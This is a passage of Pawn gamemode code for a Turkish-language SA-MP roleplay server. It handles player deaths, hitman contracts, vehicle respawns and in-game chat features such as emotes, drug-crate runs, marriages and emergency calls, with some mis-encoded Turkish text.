					SetPVarInt(playerid, "AdminDeathInt", GetPlayerInterior(playerid));

					SpawnPlayer(playerid);
				}
			}
		}
	}

	if(GetPVarInt(playerid, "Injured") == 0)
	{
		if(GetPVarInt(playerid, "EventToken") >= 1 || GetPVarInt(playerid, "PBM") > 0)
		{
			ResetPlayerWeapons(playerid);
		}
		else
		{
			ResetPlayerWeaponsEx(playerid);
		}
	}

	if(PlayerInfo[killerid][pAdmin] < 6)
	{
	    if(reason == 49)
	    {
	    	format(string, sizeof(string), "{AA3333}AdminUyarýsý{FFFF00}: %s (ID %d) muhtemelen %s (ID %d) oyuncusunu car-ramming yapa yapa öldürdü.", GetPlayerNameEx(killerid), killerid, GetPlayerNameEx(playerid), playerid);
	    	ABroadCast(COLOR_YELLOW, string, 1);
	    	//print(string);
	    }
	    if(reason == 50)
	    {
	        if(IsAHelicopter(GetPlayerVehicleID(killerid)))
	        {
	    		format(string, sizeof(string), "{AA3333}AdminUyarýsý{FFFF00}: %s (ID %d) muhtemelen %s (ID %d) oyuncusunu heli-blading yaparak öldürdü.", GetPlayerNameEx(killerid), killerid, GetPlayerNameEx(playerid), playerid);
	    		ABroadCast(COLOR_YELLOW, string, 1);
	    		//print(string);
	    	}
	    	else
	    	{
	    	    if(GetPlayerWeapon(killerid) != 32 || GetPlayerWeapon(killerid) != 28 || GetPlayerWeapon(killerid) != 29)
	    	    {
	    			format(string, sizeof(string), "{AA3333}AdminUyarýsý{FFFF00}: %s (ID %d) muhtemelen %s (ID %d) oyuncusunu car-park yaparak öldürdü.", GetPlayerNameEx(killerid), killerid, GetPlayerNameEx(playerid), playerid);
	    			ABroadCast(COLOR_YELLOW, string, 1);
	    			//print(string);
	    		}
	    		else
	    		{
	    			format(string, sizeof(string), "{AA3333}AdminUyarýsý{FFFF00}: %s (ID %d) has possibly just drivershot %s (ID %d) to death.", GetPlayerNameEx(killerid), killerid, GetPlayerNameEx(playerid), playerid);
	    			ABroadCast(COLOR_YELLOW, string, 1);
	    			//print(string);
	    		}
	    	}
	    }
	}

	if(gPlayerCheckpointStatus[playerid] > 4 && gPlayerCheckpointStatus[playerid] < 11)
	{
		DisablePlayerCheckpoint(playerid);
		gPlayerCheckpointStatus[playerid] = CHECKPOINT_NONE;
	}

	ClearCrime(playerid);
	if(PlayerInfo[playerid][pHeadValue] >= 1) {
		if(IsPlayerConnected(killerid)) {
			if(GoChase[killerid] == playerid) {
				new
					killer[MAX_PLAYER_NAME],
					name2[MAX_PLAYER_NAME],
					name[MAX_PLAYER_NAME];

				new takemoney = PlayerInfo[playerid][pHeadValue] / 4 * 2;
			 	name = GetPlayerNameEx(playerid);
				killer = GetPlayerNameEx(killerid);
				GivePlayerCash(killerid, takemoney);
				GivePlayerCash(playerid, -takemoney);
				format(string,sizeof(string),"Hitman %s, %s üzerindeki kontrakt iþini halletti ve $%d kazandý.",killer,name,PlayerInfo[playerid][pHeadValue] / 4 * 2);
				SendFamilyMessage(4, COLOR_YELLOW, string);
				format(string,sizeof(string),"Hitman tarafýndan aðýr bir þekilde yaralandýn ve $%d kaybettin.",takemoney);
   				ResetPlayerWeaponsEx(playerid);
				SendClientMessage(playerid, COLOR_YELLOW, string);

				foreach(Player, i) {
				    name2 = GetPlayerNameEx(i);
				    if(!strcmp(PlayerInfo[playerid][pContractBy], name2, true)) {
				        if(!IsPlayerStreamedIn(i, playerid)) {
				        	format(string, sizeof(string), "SMS: %s yok edildi, Gönderen: OZELMESAJ (555)", name);
							SendClientMessage(i, COLOR_YELLOW, string);
						}
				    }
				}

				PlayerInfo[playerid][pHeadValue] = 0;
				strcpy(PlayerInfo[playerid][pContractBy], "Nobody", 64);
				strcpy(PlayerInfo[playerid][pContractDetail], "Yok", 64);
				PlayerInfo[killerid][pCHits] += 1;
				GotHit[playerid] = 0;
				GetChased[playerid] = 999;
				GoChase[killerid] = 999;
			}
		}
	}
	if(IsPlayerConnected(killerid)) {
		if(GoChase[playerid] == killerid) {
			new killer[MAX_PLAYER_NAME], name[MAX_PLAYER_NAME], name2[MAX_PLAYER_NAME];
			new takemoney = PlayerInfo[playerid][pHeadValue] / 4 * 2;
			GivePlayerCash(killerid, takemoney);
			name = GetPlayerNameEx(playerid);
			killer = GetPlayerNameEx(killerid);
			format(string,128,"Hitman %s, %s üzerindeki eylemi baþaramadý ve $%d kaybetti.",name,killer,PlayerInfo[killerid][pHeadValue] / 4 * 2);
			SendFamilyMessage(4, COLOR_YELLOW, string);
			GivePlayerCash(playerid, -takemoney);
		   	format(string,128,"Hitman öldürdün ve $%d kazandýn, ayrýca kellendeki ücret gitti.",PlayerInfo[killerid][pHeadValue] / 4 * 2);
			SendClientMessage(killerid, COLOR_YELLOW, string);

			foreach(Player, i) {
			    name2 = GetPlayerNameEx(i);
			    if(!strcmp(PlayerInfo[killerid][pContractBy], name2, true)) {
			        if(!IsPlayerStreamedIn(i, killerid)) {
			        	format(string, sizeof(string), "SMS: %s eylemi üzerinde baþarýsýz olduk. Baþkasý üzerine kontrakt yapmayý deneyebilirsin, Gönderen: OZELMESAJ (555)", killer);
						SendClientMessage(i, COLOR_YELLOW, string);
					}
			    }
			}

			PlayerInfo[killerid][pHeadValue] = 0;
			strcpy(PlayerInfo[killerid][pContractBy], "Nobody", 64);
			strcpy(PlayerInfo[killerid][pContractDetail], "Yok", 64);
			PlayerInfo[playerid][pFHits] += 1;
			GotHit[playerid] = 0;
			GetChased[killerid] = 999;
			GoChase[playerid] = 999;
		}
	}
	if(GetPVarInt(playerid, "fuelonoff") == 1)
	{
		HideProgressBarForPlayer(playerid, FuelBar[playerid]);
		SetPVarInt(playerid, "fuelonoff", 0);
		DestroyProgressBar(FuelBar[playerid]);
		FuelBar[playerid] = INVALID_BAR_ID;
	}
	killerid = INVALID_PLAYER_ID;
	SetPlayerColor(playerid,TEAM_HIT_COLOR);
	return 1;
}

forward DelayedVehHealth(vehicleid);
public DelayedVehHealth(vehicleid) {
	SetVehicleHealth(vehicleid, 2500);
	return 1;
}

public OnVehicleSpawn(vehicleid) {
    VehicleStatus{vehicleid} = 0;
   	TruckContents[vehicleid] = 0;
	VehicleRadioStation[vehicleid] = 0;

	if(LockStatus[vehicleid] == 1) vehicle_lock_doors(vehicleid);
	else vehicle_unlock_doors(vehicleid);

	switch(GetVehicleModel(vehicleid)) {
		case 427, 428, 432, 601, 528: SetTimerEx("DelayedVehHealth", 1000, false, "d", vehicleid);
	}

    new v;
	foreach(Player, i)
	{
	    v = GetPlayerVehicle(i, vehicleid);
	    if(v != -1)
	    {
 			if(PlayerVehicleInfo[i][v][pvId] == vehicleid && GetVehicleModel(vehicleid) != PlayerVehicleInfo[i][v][pvModelId])
	  		{
	   			DestroyVehicle(vehicleid);
	   			VehicleRadioStation[vehicleid] = 0;
				PlayerVehicleInfo[i][v][pvId] = CreateVehicle(PlayerVehicleInfo[i][v][pvModelId], PlayerVehicleInfo[i][v][pvPosX], PlayerVehicleInfo[i][v][pvPosY], PlayerVehicleInfo[i][v][pvPosZ], PlayerVehicleInfo[i][v][pvPosAngle],PlayerVehicleInfo[i][v][pvColor1], PlayerVehicleInfo[i][v][pvColor2], -1);
				if(PlayerVehicleInfo[i][v][pvLocked] == 1) LockPlayerVehicle(i, PlayerVehicleInfo[i][v][pvId], PlayerVehicleInfo[i][v][pvLock]);
	            ChangeVehiclePaintjob(PlayerVehicleInfo[i][v][pvId], PlayerVehicleInfo[i][v][pvPaintJob]);
				ChangeVehicleColor(PlayerVehicleInfo[i][v][pvId], PlayerVehicleInfo[i][v][pvColor1], PlayerVehicleInfo[i][v][pvColor2]);
				LoadPlayerVehicleMods(i, v);
				for(new m = 0; m < MAX_MODS; m++)
	   			{
	   			    if(PlayerVehicleInfo[i][v][pvMods][m] >= 1000 && PlayerVehicleInfo[i][v][pvMods][m] <= 1193)
	   			    {
		   				if(InvalidModCheck(GetVehicleModel(vehicleid), PlayerVehicleInfo[i][v][pvMods][m]))
		      			{
		      				AddVehicleComponent(PlayerVehicleInfo[i][v][pvId], PlayerVehicleInfo[i][v][pvMods][m]);
		      			}
		      			else
		      			{
		      			    //printf("Removing invalid mod %d from %d of %s", PlayerVehicleInfo[i][v][pvMods][m], GetVehicleModel(vehicleid), GetPlayerNameEx(i));
		      			    PlayerVehicleInfo[i][v][pvMods][m] = 0;
		      			}
					}
	      		}
 			}
 			else
			{
				LoadPlayerVehicleMods(i, v);
                ChangeVehiclePaintjob(vehicleid, PlayerVehicleInfo[i][v][pvPaintJob]);
				ChangeVehicleColor(vehicleid, PlayerVehicleInfo[i][v][pvColor1], PlayerVehicleInfo[i][v][pvColor2]);
				for(new m = 0; m < MAX_MODS; m++)
	            {
	                if(PlayerVehicleInfo[i][v][pvMods][m] >= 1000 && PlayerVehicleInfo[i][v][pvMods][m] <= 1193)
	   			    {
			            if(InvalidModCheck(GetVehicleModel(vehicleid), PlayerVehicleInfo[i][v][pvMods][m]))
		                {
		    	            AddVehicleComponent(PlayerVehicleInfo[i][v][pvId], PlayerVehicleInfo[i][v][pvMods][m]);
			            }
			            else
			            {
			                //printf("Removing invalid mod %d from %d of %s", PlayerVehicleInfo[i][v][pvMods][m], GetVehicleModel(vehicleid), GetPlayerNameEx(i));
			                PlayerVehicleInfo[i][v][pvMods][m] = 0;
			            }
					}
	            }
	            if(PlayerVehicleInfo[i][v][pvLocked] == 1) LockPlayerVehicle(i, PlayerVehicleInfo[i][v][pvId], PlayerVehicleInfo[i][v][pvLock]);
			}
			new string[128];
			format(string,sizeof(string),"%s model aracýn en son park ettiðin yerde tekrar çýktý.",GetVehicleName(vehicleid));
			SendClientMessage(i, COLOR_GRAD1, string);
		}
	}

	if(LockStatus[vehicleid])
	{
		foreach(Player, i)
		{
			if(PlayerInfo[i][pLockCar] == vehicleid)
			{
				PlayerInfo[i][pLockCar] = INVALID_VEHICLE_ID;
			}
		}
	}

	if(VehicleBomb{vehicleid} == 1)
	{
		foreach(Player, i)
		{
			if(PlayerInfo[i][pFaction] == 4 || PlayerInfo[i][pLeader] == 4)
			{
				if(PlacedVehicleBomb[i] == vehicleid)
				{
					VehicleBomb{vehicleid} = 0;
  					PlacedVehicleBomb[i] = INVALID_VEHICLE_ID;
					PickUpC4(i);
					PlayerInfo[i][pC4Used] = 0;
					PlayerInfo[i][pC4Get] = 1;
				}
			}
		}
	}
	return 1;
}

public OnVehicleDeath(vehicleid, killerid)
{
    VehicleStatus{vehicleid} = 1;
   	TruckContents[vehicleid] = 0;
	VehicleRadioStation[vehicleid] = 0;
	foreach(Player, i)
	{
	    if(InsideShamal[i] == vehicleid)
	    {
     		new Float:X, Float:Y, Float:Z;
  			new Float:XB, Float:YB, Float:ZB;
			GetVehiclePos(InsideShamal[i], X, Y, Z);
			SetPlayerPos(i, X-4, Y-2.3, Z);
			GetVehiclePos(InsideShamal[i], XB, YB, ZB);
			if(ZB > 50.0)
			{
				PlayerInfo[i][pAGuns][GetWeaponSlot(46)] = 46;
				GivePlayerValidWeapon(i, 46, 60000);
			}
   			PlayerInfo[i][pVW] = 0;
			SetPlayerVirtualWorld(i, 0);
			PlayerInfo[i][pInt] = 0;
			SetPlayerInterior(i, 0);
			SendClientMessage(i, COLOR_WHITE, "Uçak hasar aldý, içinde olamazsýn.");
			InsideShamal[i] = INVALID_VEHICLE_ID;
	    }
	}
	return 1;
}

public OnPlayerText(playerid, text[])
{
	if(gPlayerLogged[playerid] != 1)
	{
		SendClientMessage(playerid, COLOR_RED, "Giriþ yapmadýn.");
		return 0;
	}
	if(PlayerInfo[playerid][pTut] == 0)
	{
		return 0;
	}
	new string[350];
	if (strcmp(":D", text, true, 10) == 0)

	{
		format(string, sizeof(string), "*%s Kahkaha Atar", GetPlayerNameEx(playerid));
		ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
		return 0;

	}

	if (strcmp(":)", text, true, 10) == 0)

	{
		format(string, sizeof(string), "*%s Gülümser", GetPlayerNameEx(playerid));
		ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
		return 0;

	}

    if (strcmp(":(", text, true, 10) == 0)

	{
		format(string, sizeof(string), "*%s Üzülür", GetPlayerNameEx(playerid));
		ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
		return 0;

	}

	if (strcmp(":P", text, true, 10) == 0)

	{
		format(string, sizeof(string), "*%s Dil Çýkarýr", GetPlayerNameEx(playerid));
		ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
		return 0;

	}

	if (strcmp(":S", text, true, 10) == 0)

	{
		format(string, sizeof(string), "*%s Tereddütte Kalýr", GetPlayerNameEx(playerid));
		ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
		return 0;

	}

	if (strcmp(":@", text, true, 10) == 0)

	{
		format(string, sizeof(string), "*%s Sinirlenir", GetPlayerNameEx(playerid));
		ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
		return 0;

	}
	new
		sendername[MAX_PLAYER_NAME],
		giveplayer[MAX_PLAYER_NAME],
		vehicleid = GetPlayerVehicleID(playerid);

	playerLastTyped[playerid] = 0;

	if(TextSpamUnmute[playerid] != 0)
	{
		if(PlayerInfo[playerid][pAdmin] < 6)
		{
			SendClientMessage(playerid, COLOR_WHITE, "Yazý yazmaktan mutelendiniz.");
			return 0;
		}
	}

	if(PlayerInfo[playerid][pAdmin] < 6)
	{
		TextSpamTimes[playerid]++;

		if(TextSpamTimes[playerid] == 5)
		{
			TextSpamTimes[playerid] = 0;
			TextSpamUnmute[playerid] = 10;
			SendClientMessage(playerid, COLOR_YELLOW, "Spam yaptýðýndan dolayý otomatik olarak mutelendin. 10 saniye sonra tekrar dene.");
			SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_FLOODPROTECTION);
			return 0;
		}
	}

	if(strfind(text, "|", true) != -1)
	{
	    SendClientMessage(playerid, COLOR_RED, "Yazýda '|' karakterini kullanamazsýn.");
		return 0;
	}

	if(PlayerInfo[playerid][pAdmin] < 4)
	{
		if(strfind(text, ":", true) != -1)
		{
			new
				i_numcount,
				i_period,
				i_pos;

			while(text[i_pos]) {
				if('0' <= text[i_pos] <= '9') i_numcount++;
				else if(text[i_pos] == '.') i_period++;
				i_pos++;
			}
			if(i_numcount >= 8 && i_period >= 3) {
				format(string,sizeof(string),"Uyarý: %s adlý oyuncu server reklamý yapýyor olabilir: '%'.", GetPlayerNameEx(playerid),text);
				ABroadCast(COLOR_RED, string, 2);
				Log("logs/hack.log", string);
				return 0;
			}
		}
	}

	if(GetPVarInt(playerid, "ChoosingDrugs") == 1)
	{
		if(strcmp("pot", text, true) == 0)
		{
			new mypoint = -1;
			for (new i=0; i<MAX_POINTS; i++)
			{
				if(IsPlayerInRangeOfPoint(playerid, 3.0, Points[i][Pointx], Points[i][Pointy], Points[i][Pointz]) && strcmp(Points[i][Name], "Drug Factory", true) == 0)
				{
					mypoint = i;
				}
			}
			if(mypoint == -1)
			{
				SendClientMessage(playerid, COLOR_GREY, "Uyuþturucu fabrikasýnda deðilsin!");
				return 0;
			}
			if(PlayerInfo[playerid][pCrates])
			{
				SendClientMessage(playerid, COLOR_GREY, "   Daha fazla uyuþturucu kasasý taþýyamazsýn!");
				SetPVarInt(playerid, "ChoosingDrugs", 0);
				return 0;
			}
	 		if(CheckPointCheck(playerid))
 			{
  				SendClientMessage(playerid, COLOR_WHITE, "Þu anki checkpoint'inizin iptal edildiðinden emin olun (Materyal paketleriniz veya mevcut checkpoint'iniz olabilir).");
    			return 0;
  			}
			if(GetPlayerCash(playerid) >= 100)
			{
				SendClientMessage(playerid, COLOR_LIGHTBLUE,"* $100 ödeyerek birkaç uyuþturucu kasasý satýn aldýn.");
				GivePlayerCash(playerid, -100);
				PlayerInfo[playerid][pCrates] = 1;
				SetPVarInt(playerid, "CrateDeliver", 1);
				SetPVarInt(playerid, "ChoosingDrugs", 0);
				SetPVarInt(playerid, "tpDrugRunTimer", 45);
				SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_TPDRUGRUNTIMER);
				SetPlayerCheckpoint(playerid, 2166.3772,-1675.3829,15.0859, 3);
				for(new i = 0; i < sizeof(FamilyInfo); i++)
				{
					if(strcmp(Points[mypoint][Owner], FamilyInfo[i][FamilyName], true) == 0)
					{
						FamilyInfo[i][FamilyBank] += 50;
					}
				}
				return 0;
			}
			else
			{
				SendClientMessage(playerid, COLOR_GREY," $100'ý karþýlayamýyorsun.");
				SetPVarInt(playerid, "ChoosingDrugs", 0);
   				return 0;
			}
		}
		else if(strcmp("crack", text, true) == 0)
		{
			new mypoint = -1;
			for (new i=0; i<MAX_POINTS; i++)
			{
				if(IsPlayerInRangeOfPoint(playerid, 3.0, Points[i][Pointx], Points[i][Pointy], Points[i][Pointz]) && strcmp(Points[i][Name], "Drug Factory", true) == 0)
				{
					mypoint = i;
				}
			}
			if(mypoint == -1)
			{
				SendClientMessage(playerid, COLOR_GREY, "Uyuþturucu fabrikasýnda deðilsin!");
				return 0;
			}
			if(PlayerInfo[playerid][pCrates])
			{
				SendClientMessage(playerid, COLOR_GREY, "   Daha fazla uyuþturucu kasasý taþýyamazsýn!");
				SetPVarInt(playerid, "ChoosingDrugs", 0);
				return 0;
			}
 			if(CheckPointCheck(playerid))
 			{
  				SendClientMessage(playerid, COLOR_WHITE, "Þu anki checkpoint'inizin iptal edildiðinden emin olun (Materyal paketleriniz veya mevcut checkpoint'iniz olabilir).");
    			return 0;
  			}
			if(GetPlayerCash(playerid) >= 100)
			{
				SendClientMessage(playerid, COLOR_LIGHTBLUE,"* $100 ödeyerek birkaç uyuþturucu kasasý satýn aldýn.");
				GivePlayerCash(playerid, -100);
				PlayerInfo[playerid][pCrates] = 1;
				SetPVarInt(playerid, "CrateDeliver", 2);
				SetPVarInt(playerid, "ChoosingDrugs", 0);
				SetPVarInt(playerid, "tpDrugRunTimer", 45);
				SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_TPDRUGRUNTIMER);
				SetPlayerCheckpoint(playerid, 2354.2808,-1169.2959,28.0066, 3);
				for(new i = 0; i < sizeof(FamilyInfo); i++)
				{
					if(strcmp(Points[mypoint][Owner], FamilyInfo[i][FamilyName], true) == 0)
					{
						FamilyInfo[i][FamilyBank] += 50;
					}
				}
				return 0;
			}
			else
			{
				SendClientMessage(playerid, COLOR_GREY," $100'ý karþýlayamýyorsun.");
				SetPVarInt(playerid, "ChoosingDrugs", 0);
   				return 0;
			}
		}
		else
		{
	 		SendClientMessage(playerid, COLOR_LIGHTRED,"Ne kaçakçýlýðý yapmak istiyorsun? 'crack' yada 'pot' yaz.");
			return 0;
		}
	}
	if(MarriageCeremoney[playerid] > 0)
	{
		if(strcmp("evet", text, true) == 0)
		{
			if(GotProposedBy[playerid] < 999)
			{
				if(IsPlayerConnected(GotProposedBy[playerid]))
				{
					GetPlayerName(playerid, sendername, sizeof(sendername));
					GetPlayerName(GotProposedBy[playerid], giveplayer, sizeof(giveplayer));
					format(string, sizeof(string), "Belediye Baþkaný: %s, %s adlý kiþiyi eþin olarak kabul ediyor musun? (Kabul etmek için 'evet' yaz, farklý birþey yazarsan evlilik iptal olur).", giveplayer,sendername);
					SendClientMessage(GotProposedBy[playerid], COLOR_WHITE, string);
					MarriageCeremoney[GotProposedBy[playerid]] = 1;
					MarriageCeremoney[playerid] = 0;
					GotProposedBy[playerid] = 999;
					return 0; // Yeah... no more "YES DILDOS SEX RAPE LOL" broadcast to the whole server
				}
				else
				{
					MarriageCeremoney[playerid] = 0;
					GotProposedBy[playerid] = 999;
					return 0;
				}
			}
			else if(ProposedTo[playerid] < 999)
			{
				if(IsPlayerConnected(ProposedTo[playerid]))
				{
					GetPlayerName(playerid, sendername, sizeof(sendername));
					GetPlayerName(ProposedTo[playerid], giveplayer, sizeof(giveplayer));
					if(PlayerInfo[playerid][pSex] == 1 && PlayerInfo[ProposedTo[playerid]][pSex] == 2)
					{
						format(string, sizeof(string), "Belediye Baþkaný: %s ve %s, sizleri... Karý & Koca ilan ediyorum, gelini öpebilirsin.", sendername, giveplayer);
						SendClientMessage(playerid, COLOR_WHITE, string);
				   		format(string, sizeof(string), "Belediye Baþkaný: %s ve %s, sizleri... Karý & Koca ilan ediyorum, damadý öpebilirsin.", giveplayer, sendername);
						SendClientMessage(ProposedTo[playerid], COLOR_WHITE, string);
						format(string, sizeof(string), "Evlilik Haberleri: Yeni bir mutlu çiftimiz var! %s ile %s evlendi!", sendername, giveplayer);
						SendClientMessageToAllEx(COLOR_WHITE, string);
					}
					else if(PlayerInfo[playerid][pSex] == 1 && PlayerInfo[ProposedTo[playerid]][pSex] == 1)
					{
						format(string, sizeof(string), "Belediye Baþkaný: %s ve %s, sizleri... Karý & Koca ilan ediyorum, gelini öpebilirsin.", sendername, giveplayer);
						SendClientMessage(playerid, COLOR_WHITE, string);
				   		format(string, sizeof(string), "Belediye Baþkaný: %s ve %s, sizleri... Karý & Koca ilan ediyorum, damadý öpebilirsin.", giveplayer, sendername);
						SendClientMessage(ProposedTo[playerid], COLOR_WHITE, string);
						format(string, sizeof(string), "Evlilik Haberleri: Yeni bir gay çiftimiz var! %s ile %s evlendi!", sendername, giveplayer);
						SendClientMessageToAllEx(COLOR_WHITE, string);
					}
					else if(PlayerInfo[playerid][pSex] == 2 && PlayerInfo[ProposedTo[playerid]][pSex] == 2)
					{
						format(string, sizeof(string), "Belediye Baþkaný: %s ve %s, sizleri... Karý & Koca ilan ediyorum, gelini öpebilirsin.", sendername, giveplayer);
						SendClientMessage(playerid, COLOR_WHITE, string);
				   		format(string, sizeof(string), "Belediye Baþkaný: %s ve %s, sizleri... Karý & Koca ilan ediyorum, damadý öpebilirsin.", giveplayer, sendername);
						SendClientMessage(ProposedTo[playerid], COLOR_WHITE, string);
						format(string, sizeof(string), "Evlilik Haberleri: Yeni bir lezbiyen çiftimiz var! %s ile %s evlendi!", sendername, giveplayer);
						SendClientMessageToAllEx(COLOR_WHITE, string);
					}
					//MarriageCeremoney[ProposedTo[playerid]] = 1;
					MarriageCeremoney[ProposedTo[playerid]] = 0;
					MarriageCeremoney[playerid] = 0;
					format(PlayerInfo[ProposedTo[playerid]][pMarriedTo], MAX_PLAYER_NAME, "%s", sendername);
					format(PlayerInfo[playerid][pMarriedTo], MAX_PLAYER_NAME, "%s", giveplayer);
					GivePlayerCash(playerid, - 10000);
					PlayerInfo[playerid][pMarried] = 1;
					PlayerInfo[ProposedTo[playerid]][pMarried] = 1;
					ProposedTo[playerid] = 999;
					MarriageCeremoney[playerid] = 0;
					return 0;
				}
				else
				{
					MarriageCeremoney[playerid] = 0;
					ProposedTo[playerid] = 999;
					return 0;
				}
			}
		}
		else
		{
			if(GotProposedBy[playerid] < 999)
			{
				if(IsPlayerConnected(GotProposedBy[playerid]))
				{
					format(string, sizeof(string), "* %s ile evlenmek istemedin çünki 'evet' demedin.", GetPlayerNameEx(GotProposedBy[playerid]));
					SendClientMessage(playerid, COLOR_YELLOW, string);
					format(string, sizeof(string), "* %s evlenme teklifine 'evet' demedi. Seninle evlenmek istemiyor.",GetPlayerNameEx(playerid));
					SendClientMessage(GotProposedBy[playerid], COLOR_YELLOW, string);
					return 0;
				}
				else
				{
					MarriageCeremoney[playerid] = 0;
					GotProposedBy[playerid] = 999;
					return 0;
				}
			}
			else if(ProposedTo[playerid] < 999)
			{
				if(IsPlayerConnected(ProposedTo[playerid]))
				{
					format(string, sizeof(string), "* %s ile evlenmek istemedin çünki 'evet' demedin.",GetPlayerNameEx(ProposedTo[playerid]));
					SendClientMessage(playerid, COLOR_YELLOW, string);
					format(string, sizeof(string), "* %s evlenme teklifine 'evet' demedi. Seninle evlenmek istemiyor.",GetPlayerNameEx(playerid));
					SendClientMessage(ProposedTo[playerid], COLOR_YELLOW, string);
					return 0;
				}
				else
				{
					MarriageCeremoney[playerid] = 0;
					ProposedTo[playerid] = 999;
					return 0;
				}
			}
		}
		return 0;
	}
	if(CallLawyer[playerid] == 111)
	{
		if(strcmp("evet", text, true) == 0)
		{
			format(string, sizeof(string), "** %s adlý kiþi hapiste ve avukata ihtiyacý var. Polis merkezine git.", GetPlayerNameEx(playerid));
			SendJobMessage(2, TEAM_AZTECAS_COLOR, string);
			SendClientMessage(playerid, COLOR_LIGHTRED, "Mesaj tüm müsait avukatlara gönderildi, lütfen bekle.");
			WantLawyer[playerid] = 0;
			CallLawyer[playerid] = 0;
			return 0;
		}
		else
		{
			SendClientMessage(playerid, COLOR_LIGHTRED, "Senin için müsait avukat yok. Hapis süren baþladý.");
			WantLawyer[playerid] = 0;
			CallLawyer[playerid] = 0;
			return 0;
		}
	}

	if(TalkingLive[playerid] != INVALID_PLAYER_ID) {
		if(PlayerInfo[playerid][pFaction] == 9 || PlayerInfo[playerid][pLeader] == 9) {
			format(string, sizeof(string), "Canlý Yayýn Sunucusu: %s: %s", GetPlayerNameEx(playerid), text);
			ICNews(COLOR_LIGHTGREEN,string);
		} else {
			format(string, sizeof(string), "Canlý Yayýn Konuðu %s: %s", GetPlayerNameEx(playerid), text);
			ICNews(COLOR_LIGHTGREEN,string);
		}
		return 0;
	}

	if(Mobile[playerid] != INVALID_PLAYER_ID)
	{
		format(string, sizeof(string), "(cep telefonu) %s söyler: %s", GetPlayerNameEx(playerid), text);
		if(IsPlayerInAnyVehicle(playerid) && IsVehicleWindowsDown[vehicleid] == 1) { //Windows closed.
			format(string, sizeof(string), "[Cam Kapalý] %s", string);
			ProxDetector(3.0, playerid, string,COLOR_FADE1,COLOR_FADE2,COLOR_FADE3,COLOR_FADE4,COLOR_FADE5);
		} else {
			ProxDetector(20.0, playerid, string,COLOR_FADE1,COLOR_FADE2,COLOR_FADE3,COLOR_FADE4,COLOR_FADE5);
			SetPlayerChatBubble(playerid,text,COLOR_WHITE,20.0,5000);
		}

		if(Mobile[playerid] == 914)
		{
			if(!text[0])
			{
				SendClientMessage(playerid, TEAM_CYAN_COLOR, "Merkez: Afedersiniz, anlayamadým?");
				return 0;
			}
			SendClientMessage(playerid, TEAM_CYAN_COLOR, "Merkez: Bu alandaki tüm birimlerimize bildirdik.");
			SendClientMessage(playerid, TEAM_CYAN_COLOR, "Bu olayý bildirdiðiniz için teþekkürler.");

			format(string, sizeof(string), "Merkez: Tüm Birimlerin Dikkatine: Arayan: %s",GetPlayerNameEx(playerid));
			SendFamilyMessage(3, COLOR_TWPINK, string);
			format(string, sizeof(string), "Merkez: Olay: %s",text);
			SendFamilyMessage(3, COLOR_TWPINK, string);

			CalledMedics[playerid] = 1;
			MedicsCallTime[playerid] = 60;
			ShowPlayerBeaconForMedics(playerid);
			SendClientMessage(playerid, COLOR_GRAD2, "   Karsidaki kiþi telefonu kapattý...");
			Mobile[playerid] = INVALID_PLAYER_ID;

			SetPlayerSpecialAction(playerid, SPECIAL_ACTION_STOPUSECELLPHONE);
			RemovePlayerAttachedObject(playerid, 9);
			return 0;
		}
		if(PlayerInfo[playerid][pPetKontrol])
		{
			format(string, sizeof(string), "%s: %s", PlayerInfo[playerid][pPetAdi], text);
			ProxDetector(20.0, playerid, string,COLOR_FADE1,COLOR_FADE2,COLOR_FADE3,COLOR_FADE4,COLOR_FADE5);
			return 0;
		}
		if(Mobile[playerid] == 913)
		{
			if(!text[0])
			{
				SendClientMessage(playerid, COLOR_ALLDEPT, "ACÝL: Üzgünüm, anlayamadým?");
				return 0;
			}
			if(strcmp("hayir", text, true) == 0)
			{
				SendClientMessage(playerid, COLOR_DBLUE, "Polis Merkezi: Bu alandaki tüm birimlere bildirdik.");
				SendClientMessage(playerid, COLOR_DBLUE, "Bu suçu ihbar ettiðiniz için teþekkür ederiz.");
				new
					szZone[MAX_ZONE_NAME];

				GetPlayer2DZone(playerid, szZone, MAX_ZONE_NAME);
				format(string, sizeof(string), "Merkez: Tüm Birimlerin Dikkatine: Ýhbar eden: %s (%s)",GetPlayerNameEx(playerid), szZone);
				SendFamilyMessage(1, COLOR_DBLUE, string);
				SendFamilyMessage(2, COLOR_DBLUE, string);
				format(string, sizeof(string), "Merkez: Suç: %s, Zanlý: Bilinmiyor",PlayerCrime[playerid][pAccusing]);
				SendFamilyMessage(1, COLOR_DBLUE, string);
				SendFamilyMessage(2, COLOR_DBLUE, string);
				CalledCops[playerid] = 1;
				CopsCallTime[playerid] = 60;
				ShowPlayerBeaconForCops(playerid);
				SendClientMessage(playerid, COLOR_GRAD2, "   Karsidaki kiþi telefonu kapattý...");
				Mobile[playerid] = INVALID_PLAYER_ID;

				SetPlayerSpecialAction(playerid, SPECIAL_ACTION_STOPUSECELLPHONE);
				RemovePlayerAttachedObject(playerid, 9);
				return 0;
			}
			new badguy = ReturnUser(text);
			if(IsPlayerConnected(badguy))
			{
				if(badguy != INVALID_PLAYER_ID)
				{
					if(PlayerInfo[badguy][pWantedLevel] > 0)
					{
						SendClientMessage(playerid, COLOR_DBLUE, "Polis Merkezi: Bu olaya birimler zaten atanmýþ.");
						SendClientMessage(playerid, COLOR_DBLUE, "Bu suçu ihbar ettiðiniz için teþekkür ederiz.");
						SendClientMessage(playerid, COLOR_GRAD2, "   Karsidaki kiþi telefonu kapattý...");
						Mobile[playerid] = INVALID_PLAYER_ID;
						return 0;
					}
					if(badguy == playerid)
					{
